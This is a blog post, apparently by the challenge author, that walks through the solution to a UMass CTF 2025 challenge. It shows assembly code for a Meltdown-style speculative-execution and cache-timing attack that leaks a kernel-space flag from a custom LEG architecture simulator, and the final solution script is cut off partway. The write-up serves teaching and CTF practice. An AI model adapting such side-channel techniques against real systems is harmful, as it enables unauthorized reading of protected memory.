<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">Jeremy&#39;s Blog - UMass CTF 2025 - Ghost in the Leg</title>
<meta property="og:title" content=Jeremy&#39;s&#32;Blog&#32;-&#32;UMass&#32;CTF&#32;2025&#32;-&#32;Ghost&#32;in&#32;the&#32;Leg />
<meta name="twitter:title" content=Jeremy&#39;s&#32;Blog&#32;-&#32;UMass&#32;CTF&#32;2025&#32;-&#32;Ghost&#32;in&#32;the&#32;Leg />
<meta itemprop="name" content=Jeremy&#39;s&#32;Blog&#32;-&#32;UMass&#32;CTF&#32;2025&#32;-&#32;Ghost&#32;in&#32;the&#32;Leg />
<meta name="application-name" content=Jeremy&#39;s&#32;Blog&#32;-&#32;UMass&#32;CTF&#32;2025&#32;-&#32;Ghost&#32;in&#32;the&#32;Leg />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://stolenfootball.github.io/posts/writeups/2025/theleg/" />
<link rel="canonical" href="https://stolenfootball.github.io/posts/writeups/2025/theleg/" itemprop="url" />
<meta name="url" content="https://stolenfootball.github.io/posts/writeups/2025/theleg/" />
<meta name="twitter:url" content="https://stolenfootball.github.io/posts/writeups/2025/theleg/" />
<meta property="og:url" content="https://stolenfootball.github.io/posts/writeups/2025/theleg/" />


<meta property="og:updated_time" content="2025-04-20T15:00:00-05:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://stolenfootball.github.io/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.138.0">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://stolenfootball.github.io/">
                <img src="/images/avatar.png" alt="brand image">
            </a>
        
        
            <a href="https://stolenfootball.github.io/">
                <h1>Jeremy&#39;s Blog</h1>
            </a>
        
    </h1>
    <p class="lead">
    By the way - is there anyone on board who knows how to fly a plane?
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about/">About</a>
                    </li>
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/stolenfootball">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/jeremy-dunn-a0b945172/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>







    <a target="_blank" class="social" title="Discord" href="https://discordapp.com/users/stolenfootball#3265">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
        </svg>
    </a>










    <a target="_blank" class="social" title="Email" href="mailto:jeremy.dunn315@gmail.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>



    <a target="_blank" class="social" title="Signal" href="https://signal.me/#eu/ikkgt8MQoJBTjgrVAOrULsPwxu8mSjGsPrW-GDGj5euZreghZMlJUb91ncEA4LQr">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.4em" viewBox="0 0 1024 1024">
            <path fill="currentColor" d="M427.5,170.3l7.9,32A319.6,319.6,0,0,0,347,238.9l-16.9-28.3A347.6,347.6,0,0,1,427.5,170.3Zm169,0-7.9,32A319.6,319.6,0,0,1,677,238.9l17.1-28.3A350.1,350.1,0,0,0,596.5,170.3ZM210.6,330a349.5,349.5,0,0,0-40.3,97.5l32,7.9A319.6,319.6,0,0,1,238.9,347ZM193,512a318.5,318.5,0,0,1,3.6-47.8l-32.6-5a352,352,0,0,0,0,105.5l32.6-4.9A319.5,319.5,0,0,1,193,512ZM693.9,813.3,677,785.1a317.8,317.8,0,0,1-88.3,36.6l7.9,32A350.3,350.3,0,0,0,693.9,813.3ZM831,512a319.5,319.5,0,0,1-3.6,47.8l32.6,4.9a352,352,0,0,0,0-105.5l-32.6,5A318.5,318.5,0,0,1,831,512Zm22.7,84.4-32-7.9A319,319,0,0,1,785.1,677l28.3,17A348.9,348.9,0,0,0,853.7,596.4Zm-293.9,231a319.1,319.1,0,0,1-95.6,0L459.3,860a351.3,351.3,0,0,0,105.4,0Zm209-126.2a318.1,318.1,0,0,1-67.6,67.5l19.6,26.6A355.1,355.1,0,0,0,795.4,721Zm-67.6-446a318.6,318.6,0,0,1,67.6,67.6L795.4,303A354.6,354.6,0,0,0,721,228.6Zm-446,67.6a318.6,318.6,0,0,1,67.6-67.6L303,228.6A354.6,354.6,0,0,0,228.6,303ZM813.4,330l-28.3,17a317.8,317.8,0,0,1,36.6,88.3l32-7.9A348.9,348.9,0,0,0,813.4,330ZM464.2,196.6a319.1,319.1,0,0,1,95.6,0l4.9-32.6a351.3,351.3,0,0,0-105.4,0ZM272.1,804.1,204,819.9l15.9-68.1-32.1-7.5-15.9,68.1a33,33,0,0,0,24.6,39.7,34.5,34.5,0,0,0,15,0l68.1-15.7Zm-77.5-89.2,32.2,7.4,11-47.2a316.2,316.2,0,0,1-35.5-86.6l-32,7.9a353.3,353.3,0,0,0,32.4,83.7Zm154,71.4-47.2,11,7.5,32.2,34.7-8.1a349,349,0,0,0,83.7,32.4l7.9-32a316.7,316.7,0,0,1-86.3-35.7ZM512,226c-158,.1-285.9,128.2-285.9,286.1a286.7,286.7,0,0,0,43.9,152L242.5,781.5,359.8,754c133.7,84.1,310.3,44,394.4-89.6S798.3,354.2,664.7,270A286.7,286.7,0,0,0,512,226s"/>
        </svg>
    </a>


        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://stolenfootball.github.io/posts/writeups/2025/theleg/">UMass CTF 2025 - Ghost in the Leg</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-04-20T15:00:00-0500" class="post-date">
        April 20, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>5 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-writeups">
        <a href="https://stolenfootball.github.io/tags/writeups">writeups</a>
      </li>
      
      <li class="tag-hardware">
        <a href="https://stolenfootball.github.io/tags/hardware">hardware</a>
      </li>
      
      <li class="tag-pwn">
        <a href="https://stolenfootball.github.io/tags/pwn">pwn</a>
      </li>
      
      <li class="tag-author">
        <a href="https://stolenfootball.github.io/tags/author">author</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <p>This is a challenge I wrote for UMass CTF 2025 using a special version theLEG™ computer architecture.  I&rsquo;ll have a separate series of blog posts on the architecture itself and why it is interesting, but for this I want to go over the specifics of the challenge.</p>
<h2 id="the-challenge">The Challenge</h2>
<p>Participants in the CTF were given the following prompt:</p>
<blockquote>
<p>TheLEG™ just got updated with a brand new UI and speculative execution extension! Surely no one can read data from kernel space&hellip;</p>
<p>The flag is at address 0x800000</p>
<p>Source for this challenge can be found at: <a href="http://bit.ly/43UdRzz" target="_blank">http://bit.ly/43UdRzz</a></p>
<p>It is highly recommended to try solutions locally before running them on remote, it will be easier to debug and MUCH faster.</p>
</blockquote>
<p>They were also provided a remote server with a web interface that looks like this:</p>
<p><img src="./images/1-leg_ui.png" alt="Leg UI"></p>
<h2 id="the-leg">The LEG</h2>
<p>The LEG is a very minimal ARM based architecture that was originally designed for the CS535 class at UMass Amherst.  It has a fixed length 32 bit instruction, and can only address on registers and immediate values.</p>
<p>For this challenge, I wrote a LEG simulator in Python that has an out of order execution extension based on Tomasulo&rsquo;s Algorithm and a G-share branch predictor. It also supports hardware exception handling for certain limited exceptions.</p>
<h2 id="the-vulnerability">The Vulnerability</h2>
<p>This version of the LEG can be attacked with a version of the Meltdown vulnerability that affects certain Intel processors.  A good place to begin learning about this vulnerability is <a href="https://meltdownattack.com/meltdown.pdf" target="_blank">with the initial paper that reported it</a>.  The paper is well constructed and explains the attack well, which is somewhat uncommon in academic attack papers.</p>
<h2 id="running-the-exploit">Running the Exploit</h2>
<p>The exploit can be thought of in a series of steps:</p>
<h3 id="step-1-access-kernel-memory">Step 1: Access kernel memory</h3>
<p>We know the flag is at 0x800000, so the first step is to load the data from that address into a register.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r0</span>, <span style="color:#ae81ff">0x8000</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lsl</span> <span style="color:#66d9ef">r0</span>, <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r0</span>
</span></span></code></pre></div><p>We now have the data from the kernel address in a reorder buffer entry that will write to <code>r1</code>.  If we run this as it is though, it will throw an exception and the data will never make into the physical register, so we&rsquo;ll never see it.</p>
<h3 id="step-2-store-the-data-before-the-exception-handler-finishes">Step 2: Store the data before the exception handler finishes</h3>
<p>The next thing we have to do is leak the data.  The key insight is that the value from the kernel exists in the reorder buffer for around 50 clock cycles before it is wiped, and other instructions can access that data in the meantime.</p>
<p>An easy side channel can be established through cache timings.  First, we need to flush the cache so it is completely empty.  This means any cache access will take roughly 15 cycles.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">flush</span>
</span></span></code></pre></div><p>Next, take the value that was retrieved from the kernel.  We&rsquo;ll leak one byte at a time, so we&rsquo;ll shift and mask so we only have one byte from the word the kernel returned:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">lsr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">and</span> <span style="color:#66d9ef">r1</span>, <span style="color:#ae81ff">0xFF</span>
</span></span></code></pre></div><p>Once we have the byte, we multiply it by the size of a cache line (64), then access the cache at the index of the kernel value.  This means there will only be one &ldquo;hot&rdquo; line in the cache - the line at the index of the kernel value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">lsl</span> <span style="color:#66d9ef">r1</span>, <span style="color:#ae81ff">0x6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r2</span>, <span style="color:#66d9ef">r1</span>
</span></span></code></pre></div><h3 id="step-3-handle-the-exception">Step 3: Handle the exception</h3>
<p>We now wait for the exception to throw and handle it without crashing.  This can be done through the LEG interface.  The exact address will change for each program, but the following is an example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">.handler</span> <span style="color:#66d9ef">DATA_ABORT</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span> <span style="color:#ae81ff">0x20</span>
</span></span></code></pre></div><h3 id="step-4-retrieve-the-value-from-the-cache">Step 4: Retrieve the value from the cache</h3>
<p>To retrieve the value, we will loop through each line of the cache, and save the index that returns its data the fastest.  This will be the &ldquo;hot&rdquo; cache line, and will be at the index that was determined by the kernel byte!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r1</span>, <span style="color:#ae81ff">0x1</span>      <span style="color:#75715e">; current fastest
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r4</span>, <span style="color:#ae81ff">0xFFF</span>    <span style="color:#75715e">; fastest time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r2</span>, <span style="color:#66d9ef">r1</span>       <span style="color:#75715e">; current fastest cycles
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Loop
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r5</span>, <span style="color:#66d9ef">r2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">r5</span>, <span style="color:#ae81ff">0x40</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">add</span> <span style="color:#66d9ef">r5</span>, <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cycles</span> <span style="color:#66d9ef">r6</span>       
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r7</span>, <span style="color:#66d9ef">r5</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cycles</span> <span style="color:#66d9ef">r7</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">r7</span>, <span style="color:#66d9ef">r6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">r7</span>, <span style="color:#66d9ef">r4</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bgt</span> <span style="color:#ae81ff">0x7c</span>        <span style="color:#75715e">; timing not the fastest, skip store
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r4</span>, <span style="color:#66d9ef">r7</span>      <span style="color:#75715e">; timing fastest seen, store index
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">r2</span>, <span style="color:#ae81ff">0x1</span>     
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">r2</span>, <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ble</span> <span style="color:#ae81ff">0x50</span>        <span style="color:#75715e">; loop back to beginning if still bytes to check
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Store result
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">str</span> <span style="color:#66d9ef">r1</span>, <span style="color:#ae81ff">0x100</span>
</span></span></code></pre></div><p>The memory address at 0x100 will contain the first byte of the flag!</p>
<h2 id="final-solution">Final solution</h2>
<p>The following script and exception handler will dump the whole flag when run against the LEG.  It is the same as the principle outlined above, but has a few more bells and whistles with the assembly.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Setup
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r9</span>, <span style="color:#ae81ff">0x30</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r10</span>, <span style="color:#ae81ff">0x0</span>     <span style="color:#75715e">; iterations
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r11</span>, <span style="color:#ae81ff">0x100</span>   <span style="color:#75715e">; place to store flag
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Access kernel addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">flush</span>             <span style="color:#75715e">; clean cache
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r0</span>, <span style="color:#ae81ff">0x8000</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lsl</span> <span style="color:#66d9ef">r0</span>, <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">r0</span>, <span style="color:#66d9ef">r10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Access cache at kernel addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r3</span>, <span style="color:#66d9ef">r10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mod</span> <span style="color:#66d9ef">r3</span>, <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">r3</span>, <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r4</span>, <span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">r4</span>, <span style="color:#66d9ef">r3</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lsr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r4</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">and</span> <span style="color:#66d9ef">r1</span>, <span style="color:#ae81ff">0xFF</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lsl</span> <span style="color:#66d9ef">r1</span>, <span style="color:#ae81ff">0x6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r2</span>, <span style="color:#66d9ef">r1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Check to see which line is the fastest
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Setup
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r1</span>, <span style="color:#ae81ff">0x1</span>     <span style="color:#75715e">; current fastest
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r4</span>, <span style="color:#ae81ff">0xFFF</span>   <span style="color:#75715e">; fastest time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r2</span>, <span style="color:#66d9ef">r1</span>      <span style="color:#75715e">; current fastest cycles
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Loop
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r5</span>, <span style="color:#66d9ef">r2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">r5</span>, <span style="color:#ae81ff">0x40</span>    <span style="color:#75715e">; cache line length
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">r5</span>, <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cycles</span> <span style="color:#66d9ef">r6</span>       
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r7</span>, <span style="color:#66d9ef">r5</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cycles</span> <span style="color:#66d9ef">r7</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">r7</span>, <span style="color:#66d9ef">r6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">r7</span>, <span style="color:#66d9ef">r4</span>
